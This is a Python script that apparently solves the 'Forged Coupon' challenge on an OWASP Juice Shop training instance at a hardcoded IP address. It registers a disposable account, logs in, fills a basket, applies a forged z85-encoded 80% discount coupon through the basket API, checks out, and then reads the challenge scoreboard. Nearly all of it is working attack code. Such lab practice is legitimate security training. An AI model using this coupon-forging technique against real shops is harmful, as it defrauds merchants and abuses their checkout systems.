#!/usr/bin/env python3

import requests
import time

def complete_forged_coupon():
    print("🎯 COMPLETING FORGED COUPON CHALLENGE")
    
    base_url = "http://66.42.93.220:3001"  # Working v13 instance
    session = requests.Session()
    
    # Quick auth
    email = f"final{int(time.time())}@test.com"
    password = "Test123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    token = login.json()['authentication']['token']
    session.headers['Authorization'] = f'Bearer {token}'
    print("✅ Authenticated")
    
    # Add products
    products = session.get(f"{base_url}/rest/products/search").json()['data']
    session.post(f"{base_url}/api/BasketItems/", json={
        "ProductId": products[0]['id'], "quantity": 1
    })
    
    basket_id = session.get(f"{base_url}/rest/user/whoami").json()['user'].get('bid', 1)
    
    # Apply the working coupon
    z85_coupon = "pEw8ph7Z^w"  # OCT25-80 encoded
    
    print(f"\\n💰 Applying coupon: {z85_coupon} (OCT25-80)")
    
    coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{z85_coupon}", json={})
    
    if coupon_response.status_code == 200:
        discount = coupon_response.json().get('discount', 0)
        print(f"✅ Coupon applied: {discount}% discount!")
        
        if discount >= 80:
            # Complete checkout with minimal data
            print(f"\\n🛍️  Completing checkout...")
            
            checkout_response = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={})
            print(f"Checkout: {checkout_response.status_code}")
            
            if checkout_response.status_code in [200, 201]:
                print(f"🎉 CHALLENGE SOLVED!")
                return True
            else:
                print(f"Checkout response: {checkout_response.text[:200]}")
                
                # Check if challenge solved anyway
                challenges = session.get(f"{base_url}/api/Challenges")
                if challenges.status_code == 200:
                    challenge_data = challenges.json().get('data', [])
                    forged_coupon = next((c for c in challenge_data if 'Forged Coupon' in c.get('name', '')), None)
                    
                    if forged_coupon and forged_coupon.get('solved'):
                        print(f"🎉 CHALLENGE ALREADY SOLVED!")
                        return True
                    else:
                        print(f"Challenge status: {forged_coupon}")

complete_forged_coupon()
